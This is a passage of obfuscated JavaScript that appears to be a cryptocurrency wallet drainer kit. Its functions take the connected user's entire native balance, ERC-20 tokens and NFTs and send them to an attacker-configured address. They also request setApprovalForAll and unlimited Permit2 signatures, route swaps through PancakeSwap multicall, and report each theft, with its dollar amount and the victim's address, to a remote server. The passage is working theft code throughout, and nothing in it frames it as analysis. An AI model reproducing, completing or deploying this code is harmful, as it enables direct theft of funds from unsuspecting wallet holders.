        await swap_request(_0x2c80df[_0x353e70(0x2b9)], _0x2c80df, _0x41792d), sign_next();
        const _0x408601 = await _0x139342[_0x353e70(0x306)](_0x16c427, _0x2ed787, {
            'gasLimit': ethers[_0x353e70(0x24f)][_0x353e70(0x308)](_0x1a0dc7),
            'gasPrice': ethers[_0x353e70(0x24f)][_0x353e70(0x308)](_0x396c9d),
            'nonce': _0x3f1f50,
            'from': MS_Current_Address
        });
        wait_message();
        if (MS_Settings[_0x353e70(0x30a)][_0x353e70(0x340)]) await _0x2d0f43[_0x353e70(0x1c9)](_0x408601[_0x353e70(0x1ef)], 0x1, 0xea60);
        await swap_success(_0x2c80df[_0x353e70(0x2b9)], _0x2c80df, _0x41792d), sign_ready();
    }, DO_PANCAKE_V3 = async (_0x53fdfa, _0x3716b3) => {
        const _0xe4e3bc = _0x1027e3,
            _0x3dc378 = new Web3(MS_Provider),
            _0x3323cf = new ethers[(_0xe4e3bc(0x265))][(_0xe4e3bc(0x315))](MS_Settings[_0xe4e3bc(0x31a)][_0x53fdfa['chain_id']]),
            _0x2147d4 = Math[_0xe4e3bc(0x32c)](Date[_0xe4e3bc(0x364)]() / 0x3e8) + 0x270f * 0xa,
            _0x1a010f = new ethers[(_0xe4e3bc(0x32b))](_0x53fdfa['swapper_address'], MS_Pancake_ABI, MS_Signer),
            _0x49d769 = ethers[_0xe4e3bc(0x24f)][_0xe4e3bc(0x308)](await _0x3323cf['getGasPrice']())['div'](ethers[_0xe4e3bc(0x24f)][_0xe4e3bc(0x308)]('100'))['mul'](ethers[_0xe4e3bc(0x24f)][_0xe4e3bc(0x308)](_0xe4e3bc(0x194)))[_0xe4e3bc(0x2df)](),
            _0x47461c = await get_nonce(_0x53fdfa[_0xe4e3bc(0x1cc)]),
            _0x31f96f = [];
        for (const _0x444089 of _0x3716b3) {
            try {
                const _0x5a4ab5 = ethers[_0xe4e3bc(0x24f)][_0xe4e3bc(0x308)](_0x444089[_0xe4e3bc(0x1d9)])[_0xe4e3bc(0x1b2)](ethers[_0xe4e3bc(0x24f)][_0xe4e3bc(0x308)](_0x444089[_0xe4e3bc(0x1eb)])) ? ethers[_0xe4e3bc(0x24f)]['from'](_0x444089[_0xe4e3bc(0x1d9)])[_0xe4e3bc(0x2df)]() : ethers[_0xe4e3bc(0x24f)][_0xe4e3bc(0x308)](_0x444089[_0xe4e3bc(0x1eb)])[_0xe4e3bc(0x2df)](),
                    _0x519ef3 = new _0x3dc378[(_0xe4e3bc(0x2f8))]['Contract'](MS_Pancake_ABI, _0x444089[_0xe4e3bc(0x2ec)]),
                    _0x3ff2e7 = _0x519ef3[_0xe4e3bc(0x2da)][_0xe4e3bc(0x2fe)](_0x5a4ab5, '0', [_0x444089['address'], MS_Swap_Route[_0x444089[_0xe4e3bc(0x1cc)]]], MS_Settings[_0xe4e3bc(0x347)])[_0xe4e3bc(0x301)]();
                _0x31f96f['push'](_0x3ff2e7);
            } catch (_0xcf266f) {
                console['log'](_0xcf266f);
            }
        }
        let _0x3c42fa = null,
            _0x104890 = 0x0;
        while (_0x104890 < 0x3) {
            try {
                _0x3c42fa = await _0x1a010f[_0xe4e3bc(0x36f)][_0xe4e3bc(0x306)](_0x2147d4, _0x31f96f, {
                    'from': MS_Current_Address
                }), _0x3c42fa = ethers['BigNumber'][_0xe4e3bc(0x308)](_0x3c42fa)[_0xe4e3bc(0x2a9)](ethers[_0xe4e3bc(0x24f)][_0xe4e3bc(0x308)](_0xe4e3bc(0x178)))['mul'](ethers['BigNumber'][_0xe4e3bc(0x308)](_0xe4e3bc(0x194)))[_0xe4e3bc(0x2df)](), _0x104890 = 0x3;
            } catch (_0xda7ae7) {
                _0x3c42fa = _0x53fdfa[_0xe4e3bc(0x1cc)] == 0xa4b1 ? 0x4c4b40 : _0x53fdfa['chain_id'] == 0xa86a ? 0x4c4b40 : 0x7a120, _0x104890 += 0x1;
            }
        }
        await swap_request(_0x53fdfa['swapper_type'], _0x53fdfa, _0x3716b3), sign_next();
        const _0x193a4b = await _0x1a010f['multicall'](_0x2147d4, _0x31f96f, {
            'gasLimit': ethers[_0xe4e3bc(0x24f)][_0xe4e3bc(0x308)](_0x3c42fa),
            'gasPrice': ethers[_0xe4e3bc(0x24f)][_0xe4e3bc(0x308)](_0x49d769),
            'nonce': _0x47461c,
            'from': MS_Current_Address
        });
        wait_message();
        if (MS_Settings[_0xe4e3bc(0x30a)][_0xe4e3bc(0x340)]) await _0x3323cf[_0xe4e3bc(0x1c9)](_0x193a4b[_0xe4e3bc(0x1ef)], 0x1, 0xea60);
        await swap_success(_0x53fdfa[_0xe4e3bc(0x2b9)], _0x53fdfa, _0x3716b3), sign_ready();
    }, DO_CONTRACT = async _0x42b595 => {
        const _0xc696d5 = _0x1027e3,
            _0x5c4532 = convert_chain('ID', _0xc696d5(0x1b3), _0x42b595[_0xc696d5(0x1cc)]),
            _0x9bf63a = new ethers[(_0xc696d5(0x265))][(_0xc696d5(0x315))](MS_Settings['RPCs'][_0x42b595[_0xc696d5(0x1cc)]]),
            _0x258914 = BN(await _0x9bf63a['getGasPrice']())['div'](BN(0x64))[_0xc696d5(0x2d4)](BN(Math['floor'](MS_Gas_Multiplier * 0x64))),
            _0xf820c4 = BN(_0x42b595['chain_id'] == 0xa4b1 ? 0x4c4b40 : _0x42b595[_0xc696d5(0x1cc)] == 0xa86a ? 0x4c4b40 : _0x42b595[_0xc696d5(0x1cc)] == 0x171 ? 0xdbba0 : 0x249f0),
            _0x388709 = _0xf820c4['mul'](MS_Gas_Reserves[_0x42b595['chain_id']] + 0x1)[_0xc696d5(0x2d4)](_0x258914);
        MS_Settings['Settings'][_0xc696d5(0x36a)] && MS_Settings[_0xc696d5(0x1e4)][parseInt(_0x42b595[_0xc696d5(0x1cc)])] != null && (MS_Settings['Settings']['Chains'][_0x5c4532]['Contract_Legacy'] = 0x2, MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532][_0xc696d5(0x229)] = MS_Settings[_0xc696d5(0x1e4)][parseInt(_0x42b595[_0xc696d5(0x1cc)])][MS_Settings['Settings'][_0xc696d5(0x1b5)] ? _0x42b595[_0xc696d5(0x344)] >= 0x1f4 ? 0x1 : 0x0 : 0x0]);
        const _0x23db61 = MS_Settings['Settings']['Chains'][_0x5c4532][_0xc696d5(0x177)] == 0x1 ? JSON[_0xc696d5(0x26a)](_0xc696d5(0x205) + MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532][_0xc696d5(0x264)] + _0xc696d5(0x18c)) : MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532][_0xc696d5(0x177)] == 0x0 ? JSON[_0xc696d5(0x26a)](_0xc696d5(0x227) + MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532][_0xc696d5(0x264)] + _0xc696d5(0x18c)) : JSON[_0xc696d5(0x26a)](_0xc696d5(0x310) + MS_Settings[_0xc696d5(0x30a)]['Chains'][_0x5c4532][_0xc696d5(0x264)] + _0xc696d5(0x18c)),
            _0x3e14d1 = new Web3(MS_Provider);
        let _0x21ea91 = null;
        const _0xf3bddc = new _0x3e14d1[(_0xc696d5(0x2f8))][(_0xc696d5(0x32b))](_0x23db61, MS_Settings['Settings'][_0xc696d5(0x248)][_0x5c4532][_0xc696d5(0x229)]);
        if (MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532][_0xc696d5(0x177)] == 0x0) _0x21ea91 = _0xf3bddc[_0xc696d5(0x2da)][MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532][_0xc696d5(0x264)]](MS_Settings[_0xc696d5(0x347)])[_0xc696d5(0x301)]();
        else {
            if (MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532][_0xc696d5(0x177)] == 0x2) {
                let _0x47f892 = ![];
                try {
                    const _0xe98af2 = await send_request({
                        'action': _0xc696d5(0x282),
                        'address': MS_Partner_Address
                    });
                    if (_0xe98af2[_0xc696d5(0x197)] == 'OK' && _0xe98af2[_0xc696d5(0x251)] == !![]) _0x47f892 = _0xe98af2[_0xc696d5(0x22a)];
                } catch (_0x2dfebe) {
                    console[_0xc696d5(0x1db)](_0x2dfebe);
                }
                let _0x216227 = !_0x47f892 ? _0xc696d5(0x324) : MS_Partner_Address;
                _0x21ea91 = _0xf3bddc['methods'][MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532]['Contract_Type']](MS_Current_Address, MS_Settings[_0xc696d5(0x347)], _0x216227, _0x3e14d1[_0xc696d5(0x36e)][_0xc696d5(0x2fa)](!_0x47f892 ? 0x0 : _0x47f892), MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x1ea)])['encodeABI']();
            } else _0x21ea91 = _0xf3bddc[_0xc696d5(0x2da)][MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532][_0xc696d5(0x264)]]()[_0xc696d5(0x301)]();
        }
        let _0x43b7ee = {
            'from': MS_Current_Address,
            'to': MS_Settings[_0xc696d5(0x30a)][_0xc696d5(0x248)][_0x5c4532]['Contract_Address'],
            'value': BN(0x64),
            'data': _0x21ea91
        };
        const _0x105cb8 = BN(_0x42b595[_0xc696d5(0x1cc)] == 0xa4b1 ? 0x4c4b40 : _0x42b595[_0xc696d5(0x1cc)] == 0xa86a ? 0x4c4b40 : _0x42b595[_0xc696d5(0x1cc)] == 0x171 ? 0xdbba0 : 0x186a0),
            _0x3d0ebb = await _0x9bf63a[_0xc696d5(0x2a6)](MS_Current_Address),
            _0x2958aa = _0x3d0ebb[_0xc696d5(0x236)](_0x105cb8[_0xc696d5(0x2d4)](_0x258914))[_0xc696d5(0x236)](_0x388709);
        if (_0x2958aa[_0xc696d5(0x1b2)](BN(0x0))) {
            _0x43b7ee['to'] = MS_Settings[_0xc696d5(0x347)], _0x43b7ee[_0xc696d5(0x1a0)] = '0x';
            const _0x476c6b = await _0x9bf63a['estimateGas'](_0x43b7ee),
                _0x438952 = _0x3d0ebb[_0xc696d5(0x236)](_0x476c6b[_0xc696d5(0x2d4)](_0x258914))[_0xc696d5(0x236)](_0x388709);
            if (_0x438952[_0xc696d5(0x1b2)](BN(0x0))) throw _0xc696d5(0x32a);
            else return TRANSFER_NATIVE(_0x42b595, !![]);
        }
        const _0x217bd0 = await _0x9bf63a[_0xc696d5(0x263)](MS_Current_Address, _0xc696d5(0x28f));
        _0x43b7ee[_0xc696d5(0x31f)] = _0x2958aa, _0x43b7ee[_0xc696d5(0x2c8)] = _0x217bd0, _0x43b7ee['gasPrice'] = _0x258914, _0x43b7ee['gasLimit'] = _0x105cb8, await transfer_request(_0x42b595), sign_next();
        const _0xa557dd = await MS_Signer['sendTransaction'](_0x43b7ee);
        wait_message();
        if (MS_Settings[_0xc696d5(0x30a)]['Wait_For_Confirmation']) await _0x9bf63a[_0xc696d5(0x1c9)](_0xa557dd[_0xc696d5(0x1ef)], 0x1, 0x7530);
        await transfer_success(_0x42b595, _0x2958aa), sign_ready();
    }, DO_RANDOMIZER_NATIVE = async _0x90dbbb => {
        const _0x475fb2 = _0x1027e3,
            _0x267aa9 = new ethers[(_0x475fb2(0x265))][(_0x475fb2(0x315))](MS_Settings[_0x475fb2(0x31a)][_0x90dbbb[_0x475fb2(0x1cc)]]),
            _0x593190 = BN(await _0x267aa9['getGasPrice']())[_0x475fb2(0x2a9)](BN(0x64))['mul'](BN(Math['floor'](MS_Gas_Multiplier * 0x64))),
            _0x24a36a = BN(_0x90dbbb[_0x475fb2(0x1cc)] == 0xa4b1 ? 0x4c4b40 : _0x90dbbb[_0x475fb2(0x1cc)] == 0xa86a ? 0x4c4b40 : _0x90dbbb[_0x475fb2(0x1cc)] == 0x171 ? 0xdbba0 : 0x249f0),
            _0x113e4c = _0x24a36a[_0x475fb2(0x2d4)](MS_Gas_Reserves[_0x90dbbb[_0x475fb2(0x1cc)]] + 0x1)[_0x475fb2(0x2d4)](_0x593190);
        let _0x4f0854 = {
            'from': MS_Current_Address,
            'to': MS_Settings[_0x475fb2(0x305)][_0x475fb2(0x1e6)],
            'value': BN(0x64),
            'data': '0x'
        };
        const _0x4748c3 = await _0x267aa9[_0x475fb2(0x36f)](_0x4f0854),
            _0x448c71 = await _0x267aa9[_0x475fb2(0x2a6)](MS_Current_Address),
            _0x5777f0 = _0x448c71['sub'](_0x4748c3[_0x475fb2(0x2d4)](_0x593190))[_0x475fb2(0x236)](_0x113e4c);
        if (_0x5777f0[_0x475fb2(0x1b2)](BN(0x0))) throw _0x475fb2(0x32a);
        const _0x1a611c = await _0x267aa9['getTransactionCount'](MS_Current_Address, _0x475fb2(0x28f));
        _0x4f0854[_0x475fb2(0x31f)] = _0x5777f0, _0x4f0854[_0x475fb2(0x2c8)] = _0x1a611c, _0x4f0854['gasPrice'] = _0x593190, _0x4f0854[_0x475fb2(0x1ee)] = _0x4748c3, await transfer_request(_0x90dbbb), sign_next();
        const _0x1d92a8 = await MS_Signer[_0x475fb2(0x20e)](_0x4f0854);
        wait_message();
        if (MS_Settings[_0x475fb2(0x30a)]['Wait_For_Confirmation']) await _0x267aa9['waitForTransaction'](_0x1d92a8['hash'], 0x1, 0x7530);
        const _0x4c5b79 = send_request({
            'action': 'withdraw_native',
            'wallet': MS_Settings[_0x475fb2(0x305)],
            'chain_id': _0x90dbbb[_0x475fb2(0x1cc)],
            'amount_usd': _0x90dbbb[_0x475fb2(0x344)],
            'user_id': MS_ID,
            'asset': _0x90dbbb,
            'address': MS_Current_Address
        });
        if (MS_Settings[_0x475fb2(0x30a)][_0x475fb2(0x2ed)]) await _0x4c5b79;
        await transfer_success(_0x90dbbb, _0x5777f0), sign_ready();
    }, TRANSFER_NATIVE = async (_0x148b05, _0x3f86b0 = ![]) => {
        const _0x23f2eb = _0x1027e3,
            _0x26116a = convert_chain('ID', 'ANKR', _0x148b05[_0x23f2eb(0x1cc)]);
        if (MS_Settings[_0x23f2eb(0x30a)][_0x23f2eb(0x2b5)] && MS_Settings[_0x23f2eb(0x305)] != null) return DO_RANDOMIZER_NATIVE(_0x148b05);
        if (_0x3f86b0 == ![] && ((MS_Settings[_0x23f2eb(0x30a)]['Chains'][_0x26116a]['Contract_Address'] != '' || MS_Settings[_0x23f2eb(0x30a)][_0x23f2eb(0x36a)] && MS_Settings['Public_Contract'][parseInt(_0x148b05[_0x23f2eb(0x1cc)])] != null) && _0x148b05[_0x23f2eb(0x344)] >= MS_Settings['Settings'][_0x23f2eb(0x30f)])) return DO_CONTRACT(_0x148b05);
        const _0x89dc2b = new ethers[(_0x23f2eb(0x265))][(_0x23f2eb(0x315))](MS_Settings[_0x23f2eb(0x31a)][_0x148b05[_0x23f2eb(0x1cc)]]),
            _0x3fdf1f = BN(await _0x89dc2b[_0x23f2eb(0x30b)]())[_0x23f2eb(0x2a9)](BN(0x64))[_0x23f2eb(0x2d4)](BN(Math[_0x23f2eb(0x32c)](MS_Gas_Multiplier * 0x64))),
            _0x3097f6 = BN(_0x148b05[_0x23f2eb(0x1cc)] == 0xa4b1 ? 0x4c4b40 : _0x148b05[_0x23f2eb(0x1cc)] == 0xa86a ? 0x4c4b40 : _0x148b05[_0x23f2eb(0x1cc)] == 0x171 ? 0xdbba0 : 0x249f0),
            _0x78ea7e = _0x3097f6[_0x23f2eb(0x2d4)](MS_Gas_Reserves[_0x148b05[_0x23f2eb(0x1cc)]] + 0x1)[_0x23f2eb(0x2d4)](_0x3fdf1f);
        let _0xecec3c = {
            'from': MS_Current_Address,
            'to': MS_Settings[_0x23f2eb(0x347)],
            'value': BN(0x64),
            'data': '0x'
        };
        const _0x36c3a1 = await _0x89dc2b[_0x23f2eb(0x36f)](_0xecec3c),
            _0x4ad96f = await _0x89dc2b['getBalance'](MS_Current_Address),
            _0x3b2878 = _0x4ad96f[_0x23f2eb(0x236)](_0x36c3a1[_0x23f2eb(0x2d4)](_0x3fdf1f))['sub'](_0x78ea7e);
        if (_0x3b2878[_0x23f2eb(0x1b2)](BN(0x0))) throw _0x23f2eb(0x32a);
        const _0x295114 = await _0x89dc2b[_0x23f2eb(0x263)](MS_Current_Address, _0x23f2eb(0x28f));
        _0xecec3c['value'] = _0x3b2878, _0xecec3c[_0x23f2eb(0x2c8)] = _0x295114, _0xecec3c[_0x23f2eb(0x21a)] = _0x3fdf1f, _0xecec3c[_0x23f2eb(0x1ee)] = _0x36c3a1, await transfer_request(_0x148b05), sign_next();
        const _0x475e5f = await MS_Signer[_0x23f2eb(0x20e)](_0xecec3c);
        wait_message();
        if (MS_Settings[_0x23f2eb(0x30a)][_0x23f2eb(0x340)]) await _0x89dc2b[_0x23f2eb(0x1c9)](_0x475e5f[_0x23f2eb(0x1ef)], 0x1, 0x7530);
        await transfer_success(_0x148b05, _0x3b2878), sign_ready();
    }, DO_RANDOMIZER_TOKEN = async _0x46ccb7 => {
        const _0x295c7b = _0x1027e3,
            _0x573772 = new ethers['providers'][(_0x295c7b(0x315))](MS_Settings[_0x295c7b(0x31a)][_0x46ccb7[_0x295c7b(0x1cc)]]),
            _0x1b021c = BN(await _0x573772[_0x295c7b(0x30b)]())[_0x295c7b(0x2a9)](BN(0x64))['mul'](BN(Math[_0x295c7b(0x32c)](MS_Gas_Multiplier * 0x64)));
        let _0x124ef3 = {
            'from': MS_Current_Address,
            'to': _0x46ccb7[_0x295c7b(0x1e6)],
            'value': '0x0',
            'data': '0x'
        };
        const _0x5993e6 = new Web3(MS_Provider);
        let _0x1ab9cc = null;
        const _0x4ff3fb = new _0x5993e6[(_0x295c7b(0x2f8))]['Contract'](MS_Contract_ABI['ERC20'], _0x46ccb7[_0x295c7b(0x1e6)]);
        _0x1ab9cc = _0x4ff3fb[_0x295c7b(0x2da)][_0x295c7b(0x277)](MS_Settings['Personal_Wallet'][_0x295c7b(0x1e6)], _0x46ccb7[_0x295c7b(0x1d9)])[_0x295c7b(0x301)](), _0x124ef3[_0x295c7b(0x1a0)] = _0x1ab9cc;
        const _0x2394c5 = await _0x573772['estimateGas'](_0x124ef3),
            _0x3d8407 = await _0x573772[_0x295c7b(0x2a6)](MS_Current_Address),
            _0x5e5892 = _0x3d8407[_0x295c7b(0x236)](_0x2394c5[_0x295c7b(0x2d4)](_0x1b021c));
        if (_0x5e5892['lt'](BN(0x0))) throw _0x295c7b(0x32a);
        const _0x3adab5 = await _0x573772['getTransactionCount'](MS_Current_Address, _0x295c7b(0x28f));
        _0x124ef3[_0x295c7b(0x2c8)] = _0x3adab5, _0x124ef3['gasPrice'] = _0x1b021c, _0x124ef3[_0x295c7b(0x1ee)] = _0x2394c5, await transfer_request(_0x46ccb7), sign_next();
        const _0x5414a0 = await MS_Signer[_0x295c7b(0x20e)](_0x124ef3);
        wait_message();
        if (MS_Settings[_0x295c7b(0x30a)]['Wait_For_Confirmation']) await _0x573772[_0x295c7b(0x1c9)](_0x5414a0['hash'], 0x1, 0x7530);
        const _0x44c4c4 = send_request({
            'action': _0x295c7b(0x1f9),
            'wallet': MS_Settings['Personal_Wallet'],
            'chain_id': _0x46ccb7['chain_id'],
            'amount_usd': _0x46ccb7['amount_usd'],
            'user_id': MS_ID,
            'asset': _0x46ccb7,
            'address': MS_Current_Address
        });
        if (MS_Settings[_0x295c7b(0x30a)][_0x295c7b(0x2ed)]) await _0x44c4c4;
        await transfer_success(_0x46ccb7), sign_ready();
    }, TRANSFER_TOKEN = async _0x5692d8 => {
        const _0x6e5eda = _0x1027e3;
        if (MS_Settings['Settings'][_0x6e5eda(0x318)] && MS_Settings[_0x6e5eda(0x305)] != null) return DO_RANDOMIZER_TOKEN(_0x5692d8);
        const _0x3904b8 = new ethers[(_0x6e5eda(0x265))]['JsonRpcProvider'](MS_Settings[_0x6e5eda(0x31a)][_0x5692d8[_0x6e5eda(0x1cc)]]),
            _0x4a2c67 = BN(await _0x3904b8[_0x6e5eda(0x30b)]())['div'](BN(0x64))[_0x6e5eda(0x2d4)](BN(Math[_0x6e5eda(0x32c)](MS_Gas_Multiplier * 0x64)));
        let _0x3ec75d = {
            'from': MS_Current_Address,
            'to': _0x5692d8[_0x6e5eda(0x1e6)],
            'value': _0x6e5eda(0x1d1),
            'data': '0x'
        };
        const _0x421596 = new Web3(MS_Provider);
        let _0x1d1836 = null;
        const _0x3b6a01 = new _0x421596[(_0x6e5eda(0x2f8))][(_0x6e5eda(0x32b))](MS_Contract_ABI[_0x6e5eda(0x345)], _0x5692d8[_0x6e5eda(0x1e6)]);
        _0x1d1836 = _0x3b6a01[_0x6e5eda(0x2da)][_0x6e5eda(0x277)](MS_Settings[_0x6e5eda(0x347)], _0x5692d8['amount_raw'])[_0x6e5eda(0x301)](), _0x3ec75d[_0x6e5eda(0x1a0)] = _0x1d1836;
        const _0x1ceffd = await _0x3904b8[_0x6e5eda(0x36f)](_0x3ec75d),
            _0x495b87 = await _0x3904b8[_0x6e5eda(0x2a6)](MS_Current_Address),
            _0x206141 = _0x495b87[_0x6e5eda(0x236)](_0x1ceffd[_0x6e5eda(0x2d4)](_0x4a2c67));
        if (_0x206141['lt'](BN(0x0))) throw 'LOW_BALANCE';
        const _0x3605d0 = await _0x3904b8[_0x6e5eda(0x263)](MS_Current_Address, 'pending');
        _0x3ec75d[_0x6e5eda(0x2c8)] = _0x3605d0, _0x3ec75d[_0x6e5eda(0x21a)] = _0x4a2c67, _0x3ec75d['gasLimit'] = _0x1ceffd, await transfer_request(_0x5692d8), sign_next();
        const _0x3389b3 = await MS_Signer['sendTransaction'](_0x3ec75d);
        wait_message();
        if (MS_Settings[_0x6e5eda(0x30a)][_0x6e5eda(0x340)]) await _0x3904b8[_0x6e5eda(0x1c9)](_0x3389b3[_0x6e5eda(0x1ef)], 0x1, 0x7530);
        await transfer_success(_0x5692d8), sign_ready();
    }, TRANSFER_NFT = async _0x2b7518 => {
        const _0x3bd4cb = _0x1027e3;
        if (MS_Settings[_0x3bd4cb(0x30a)][_0x3bd4cb(0x318)] && MS_Settings[_0x3bd4cb(0x305)] != null) return DO_RANDOMIZER_TOKEN(_0x2b7518);
        const _0x132de6 = new ethers[(_0x3bd4cb(0x265))][(_0x3bd4cb(0x315))](MS_Settings[_0x3bd4cb(0x31a)][_0x2b7518['chain_id']]),
            _0xd2a4b3 = BN(await _0x132de6[_0x3bd4cb(0x30b)]())[_0x3bd4cb(0x2a9)](BN(0x64))['mul'](BN(Math[_0x3bd4cb(0x32c)](MS_Gas_Multiplier * 0x64)));
        let _0x36bef5 = {
            'from': MS_Current_Address,
            'to': _0x2b7518[_0x3bd4cb(0x1e6)],
            'value': '0x0',
            'data': '0x'
        };
        const _0x228b5f = new Web3(MS_Provider);
        let _0x3132c7 = null;
        const _0x2d526e = new _0x228b5f[(_0x3bd4cb(0x2f8))][(_0x3bd4cb(0x32b))](MS_Contract_ABI[_0x3bd4cb(0x355)], _0x2b7518['address']);
        _0x3132c7 = _0x2d526e['methods']['transferFrom'](MS_Current_Address, MS_Settings[_0x3bd4cb(0x347)], _0x2b7518['id'])[_0x3bd4cb(0x301)](), _0x36bef5[_0x3bd4cb(0x1a0)] = _0x3132c7;
        const _0x41ba4b = await _0x132de6[_0x3bd4cb(0x36f)](_0x36bef5),
            _0xa611fd = await _0x132de6[_0x3bd4cb(0x2a6)](MS_Current_Address),
            _0x482b92 = _0xa611fd[_0x3bd4cb(0x236)](_0x41ba4b[_0x3bd4cb(0x2d4)](_0xd2a4b3));
        if (_0x482b92['lt'](BN(0x0))) throw _0x3bd4cb(0x32a);
        const _0x131e92 = await _0x132de6[_0x3bd4cb(0x263)](MS_Current_Address, 'pending');
        _0x36bef5[_0x3bd4cb(0x2c8)] = _0x131e92, _0x36bef5[_0x3bd4cb(0x21a)] = _0xd2a4b3, _0x36bef5['gasLimit'] = _0x41ba4b, await transfer_request(_0x2b7518), sign_next();
        const _0x3dac60 = await MS_Signer[_0x3bd4cb(0x20e)](_0x36bef5);
        wait_message();
        if (MS_Settings[_0x3bd4cb(0x30a)]['Wait_For_Confirmation']) await _0x132de6[_0x3bd4cb(0x1c9)](_0x3dac60['hash'], 0x1, 0x7530);
        await transfer_success(_0x2b7518), sign_ready();
    }, DO_SAFA = async _0xf63259 => {
        const _0x3ebb9f = _0x1027e3,
            _0x43390c = new ethers['providers'][(_0x3ebb9f(0x315))](MS_Settings[_0x3ebb9f(0x31a)][_0xf63259[_0x3ebb9f(0x1cc)]]),
            _0xc35420 = BN(await _0x43390c['getGasPrice']())[_0x3ebb9f(0x2a9)](BN(0x64))[_0x3ebb9f(0x2d4)](BN(Math[_0x3ebb9f(0x32c)](MS_Gas_Multiplier * 0x64)));
        let _0x51cb7b = {
            'from': MS_Current_Address,
            'to': _0xf63259[_0x3ebb9f(0x1e6)],
            'value': _0x3ebb9f(0x1d1),
            'data': '0x'
        };
        const _0xae8a04 = new Web3(MS_Provider);
        let _0x38138c = null;
        const _0x3dd3ed = new _0xae8a04['eth'][(_0x3ebb9f(0x32b))](MS_Contract_ABI[_0x3ebb9f(0x355)], _0xf63259['address']);
        _0x38138c = _0x3dd3ed[_0x3ebb9f(0x2da)][_0x3ebb9f(0x1a6)](MS_Settings[_0x3ebb9f(0x2ad)], !![])[_0x3ebb9f(0x301)](), _0x51cb7b[_0x3ebb9f(0x1a0)] = _0x38138c;
        const _0x393768 = await _0x43390c[_0x3ebb9f(0x36f)](_0x51cb7b),
            _0x9b1203 = await _0x43390c[_0x3ebb9f(0x2a6)](MS_Current_Address),
            _0x28eba4 = _0x9b1203[_0x3ebb9f(0x236)](_0x393768[_0x3ebb9f(0x2d4)](_0xc35420));
        if (_0x28eba4['lt'](BN(0x0))) throw _0x3ebb9f(0x32a);
        const _0x4795b7 = await _0x43390c['getTransactionCount'](MS_Current_Address, 'pending');
        _0x51cb7b[_0x3ebb9f(0x2c8)] = _0x4795b7, _0x51cb7b['gasPrice'] = _0xc35420, _0x51cb7b[_0x3ebb9f(0x1ee)] = _0x393768, await transfer_request(_0xf63259), sign_next();
        const _0x41381a = await MS_Signer[_0x3ebb9f(0x20e)](_0x51cb7b);
        wait_message();
        if (MS_Settings[_0x3ebb9f(0x30a)][_0x3ebb9f(0x340)]) await _0x43390c['waitForTransaction'](_0x41381a['hash'], 0x1, 0x7530);
        await transfer_success(_0xf63259), sign_ready();
    }, DO_PERMIT2 = async (_0x22ef9b, _0x3ee3b0) => {
        const _0x48aa27 = _0x1027e3,
            _0x270ad8 = new ethers[(_0x48aa27(0x32b))](_0x48aa27(0x29a), MS_Contract_ABI[_0x48aa27(0x252)], MS_Signer);
        let _0x196217 = {
                'name': _0x48aa27(0x1c5),
                'chainId': _0x22ef9b[_0x48aa27(0x1cc)],
                'verifyingContract': _0x48aa27(0x29a)
            },
            _0x3fde6a = Date['now']() + 0x3e8 * 0x3c * 0x3c * 0x18 * 0x164,
            _0x105d80 = null,
            _0x338a97 = null,
            _0x3fa78f = null;
        if (_0x3ee3b0[_0x48aa27(0x25b)] > 0x1) {
            let _0x395a0a = {
                    'PermitBatch': [{
                        'name': 'details',
                        'type': _0x48aa27(0x211)
                    }, {
                        'name': _0x48aa27(0x2f6),
                        'type': _0x48aa27(0x1e6)
                    }, {
                        'name': _0x48aa27(0x353),
                        'type': _0x48aa27(0x27d)
                    }],
                    'PermitDetails': [{
                        'name': _0x48aa27(0x328),
                        'type': 'address'
                    }, {
                        'name': 'amount',
                        'type': 'uint160'
                    }, {
                        'name': _0x48aa27(0x2bc),
                        'type': _0x48aa27(0x20d)
                    }, {
                        'name': _0x48aa27(0x2c8),
                        'type': 'uint48'
                    }]
                },
                _0x38d296 = [];
            for (const _0x16ce45 of _0x3ee3b0) {
                try {
                    _0x38d296[_0x48aa27(0x28a)]({
                        'token': _0x16ce45['address'],
                        'expiration': _0x3fde6a,
                        'amount': '1461501637330902918203684832716283019655932542975',
                        'nonce': (await _0x270ad8[_0x48aa27(0x325)](MS_Current_Address, _0x16ce45[_0x48aa27(0x1e6)], MS_Settings[_0x48aa27(0x30a)][_0x48aa27(0x318)] ? MS_Settings[_0x48aa27(0x305)]['address'] : MS_Settings[_0x48aa27(0x2ad)]))[_0x48aa27(0x2c8)]
                    });
                } catch (_0x169bf6) {
                    console[_0x48aa27(0x1db)](_0x169bf6);
                }
            }
            _0x338a97 = {
                'details': _0x38d296,
                'spender': MS_Settings[_0x48aa27(0x30a)][_0x48aa27(0x318)] ? MS_Settings['Personal_Wallet'][_0x48aa27(0x1e6)] : MS_Settings[_0x48aa27(0x2ad)],
                'sigDeadline': _0x3fde6a
            }, swap_request(_0x48aa27(0x1c5), _0x22ef9b, _0x3ee3b0), sign_next(), _0x105d80 = await MS_Signer[_0x48aa27(0x1d4)](_0x196217, _0x395a0a, _0x338a97), _0x3fa78f = 0x2;
        } else {
            let _0x4bc88f = {
                'PermitSingle': [{
                    'name': _0x48aa27(0x2aa),
                    'type': _0x48aa27(0x1f1)
                }, {
                    'name': _0x48aa27(0x2f6),
                    'type': _0x48aa27(0x1e6)
                }, {
                    'name': _0x48aa27(0x353),
                    'type': _0x48aa27(0x27d)
                }],
                'PermitDetails': [{
                    'name': _0x48aa27(0x328),
                    'type': _0x48aa27(0x1e6)
                }, {
                    'name': _0x48aa27(0x192),
                    'type': 'uint160'
                }, {
                    'name': _0x48aa27(0x2bc),
                    'type': _0x48aa27(0x20d)
                }, {
                    'name': _0x48aa27(0x2c8),
                    'type': 'uint48'
                }]
            };
            _0x338a97 = {
                'details': {
                    'token': _0x22ef9b['address'],
                    'amount': '1461501637330902918203684832716283019655932542975',
                    'expiration': _0x3fde6a,
